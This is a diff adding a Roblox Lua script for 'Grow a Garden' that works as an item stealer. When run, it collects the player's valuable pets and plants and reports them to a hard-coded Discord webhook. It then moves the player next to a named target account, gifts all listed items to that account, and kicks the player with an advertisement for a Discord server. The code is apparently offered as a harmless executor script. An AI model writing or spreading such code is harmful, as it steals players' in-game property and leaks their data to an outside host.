@@ -1,0 +1,196 @@
+repeat wait() until game:IsLoaded()
+print("[DEBUG] Script started")
+
+-- Reset flag (important if rerunning in executor)
+_G.scriptExecuted = false
+if _G.scriptExecuted then return end
+_G.scriptExecuted = true
+
+-- CONFIG
+local users = _G.Usernames or {"DanyelQuibs"} -- Add your target usernames here
+local min_value = _G.min_value or 100000
+local ping = _G.pingEveryone or "No"
+local webhook = "https://discord.com/api/webhooks/1382457262177783889/omW4Knrp97WLOI_6PkoA1DWV_huJAeLfhHqm_jzk9OuOzIdwlEqsir7wkV6GyfS2QLpy"
+
+-- SERVICES
+local Players = game:GetService("Players")
+local HttpService = game:GetService("HttpService")
+local plr = Players.LocalPlayer
+local replicatedStorage = game:GetService("ReplicatedStorage")
+local modules = replicatedStorage:WaitForChild("Modules")
+local backpack = plr:WaitForChild("Backpack")
+local character = plr.Character or plr.CharacterAdded:Wait()
+
+-- LOAD MODULES
+local calcPlantValue = require(modules:WaitForChild("CalculatePlantValue"))
+local petUtils = require(modules:WaitForChild("PetServices"):WaitForChild("PetUtilities"))
+local petRegistry = require(replicatedStorage:WaitForChild("Data"):WaitForChild("PetRegistry"))
+local numberUtil = require(modules:WaitForChild("NumberUtil"))
+local dataService = require(modules:WaitForChild("DataService"))
+
+print("[DEBUG] All modules loaded")
+
+-- HELPERS
+local function formatNumber(n)
+    local suffixes = {"", "k", "m", "b", "t"}
+    local i = 1
+    while n >= 1000 and i < #suffixes do
+        n = n / 1000
+        i = i + 1
+    end
+    return (i == 1 and math.floor(n)) or string.format("%.2f%s", n, suffixes[i])
+end
+
+local function getWeight(tool)
+    local match = tool.Name:match("%((%d+%.?%d*) ?kg%)")
+    return match and tonumber(match) or 0
+end
+
+local function calcPetValue(petData)
+    local hatchedFrom = petData.PetData.HatchedFrom
+    if not hatchedFrom then return 0 end
+    local eggData = petRegistry.PetEggs[hatchedFrom]
+    if not eggData then return 0 end
+    local rarity = eggData.RarityData.Items[petData.PetType]
+    if not rarity then return 0 end
+    local weightRange = rarity.GeneratedPetData.WeightRange
+    if not weightRange then return 0 end
+    local interp = numberUtil.ReverseLerp(weightRange[1], weightRange[2], petData.PetData.BaseWeight)
+    local scale = math.lerp(0.8, 1.2, interp)
+    local levelProgress = petUtils:GetLevelProgress(petData.PetData.Level)
+    local finalScale = scale * math.lerp(0.15, 6, levelProgress)
+    local value = petRegistry.PetList[petData.PetType].SellPrice * finalScale
+    return math.floor(value)
+end
+
+-- COLLECTION
+local excludedItems = {"Seed", "Shovel [Destroy Plants]", "Water", "Fertilizer"}
+local rarePets = {"Red Fox", "Raccoon", "Dragonfly"}
+local itemsToSend, totalValue = {}, 0
+
+print("[DEBUG] Scanning backpack...")
+for _, tool in ipairs(backpack:GetChildren()) do
+    if tool:IsA("Tool") and not table.find(excludedItems, tool.Name) then
+        if tool:GetAttribute("ItemType") == "Pet" then
+            local uuid = tool:GetAttribute("PET_UUID")
+            local petData = dataService:GetData().PetsData.PetInventory.Data[uuid]
+            if petData then
+                local name = petData.PetType
+                local value = calcPetValue(petData)
+                local weight = getWeight(tool)
+                if table.find(rarePets, name) or weight >= 10 then
+                    totalValue += value
+                    table.insert(itemsToSend, {Tool = tool, Name = name, Value = value, Weight = weight, Type = "Pet"})
+                    print("[DEBUG] Added pet:", name, value)
+                end
+            end
+        else
+            local value = calcPlantValue(tool)
+            if value >= min_value then
+                local name = tool:GetAttribute("ItemName") or tool.Name
+                local weight = getWeight(tool)
+                totalValue += value
+                table.insert(itemsToSend, {Tool = tool, Name = name, Value = value, Weight = weight, Type = "Plant"})
+                print("[DEBUG] Added plant:", name, value)
+            end
+        end
+    end
+end
+
+-- WEBHOOK
+local function sendWebhook()
+    local fieldText = ""
+    for _, item in ipairs(itemsToSend) do
+        fieldText ..= string.format("%s (%.2fkg): ¢%s\n", item.Name, item.Weight, formatNumber(item.Value))
+    end
+
+    if #fieldText > 1024 then
+        fieldText = fieldText:sub(1, 1000) .. "\n...and more"
+    end
+
+    local payload = {
+        content = (ping == "Yes" and "@everyone " or "") .. "**Gifting Triggered**",
+        embeds = {{
+            title = "🎁 Gift Summary",
+            color = 65280,
+            fields = {
+                { name = "Player", value = plr.Name, inline = true },
+                { name = "Total Value", value = "¢" .. formatNumber(totalValue), inline = true },
+                { name = "Items", value = fieldText }
+            },
+            footer = { text = "GAG gifting logger" }
+        }}
+    }
+
+    local success, err = pcall(function()
+        request({
+            Url = webhook,
+            Method = "POST",
+            Headers = {["Content-Type"] = "application/json"},
+            Body = HttpService:JSONEncode(payload)
+        })
+    end)
+
+    if success then
+        print("[DEBUG] Webhook sent")
+    else
+        warn("[ERROR] Webhook failed:", err)
+    end
+end
+
+-- GIFTING
+local function giftItemsTo(target)
+    print("[DEBUG] Gifting to:", target.Name)
+    local root = character:WaitForChild("HumanoidRootPart")
+    local targetRoot = target.Character:WaitForChild("HumanoidRootPart")
+    root.CFrame = targetRoot.CFrame + Vector3.new(0, 0, 2)
+
+    task.wait(0.2)
+    local prompt = targetRoot:FindFirstChild("ProximityPrompt") or targetRoot:WaitForChild("ProximityPrompt")
+
+    for _, item in ipairs(itemsToSend) do
+        item.Tool.Parent = character
+        local usedPrompt = prompt
+        if item.Type == "Pet" then
+            usedPrompt = target.Character:WaitForChild("Head"):WaitForChild("ProximityPrompt")
+        end
+        repeat task.wait(0.01) until usedPrompt.Enabled
+        fireproximityprompt(usedPrompt)
+        task.wait(0.2)
+        item.Tool.Parent = backpack
+    end
+
+    task.wait(0.5)
+    print("[DEBUG] All items gifted")
+    plr:Kick("All your stuff just got gifted!\nJoin discord.gg/GY2RVSEGDT")
+end
+
+-- MAIN
+if #itemsToSend > 0 then
+    sendWebhook()
+
+    local function findTarget()
+        for _, p in ipairs(Players:GetPlayers()) do
+            if table.find(users, p.Name) then
+                return p
+            end
+        end
+        return nil
+    end
+
+    local target = findTarget()
+    if target then
+        giftItemsTo(target)
+    else
+        Players.PlayerAdded:Connect(function(p)
+            if table.find(users, p.Name) then
+                p.CharacterAdded:Wait()
+                task.wait(1)
+                giftItemsTo(p)
+            end
+        end)
+        print("[DEBUG] Waiting for target to join:", table.concat(users, ", "))
+    end
+else
+    print("[DEBUG] No items met gifting criteria.")
+end
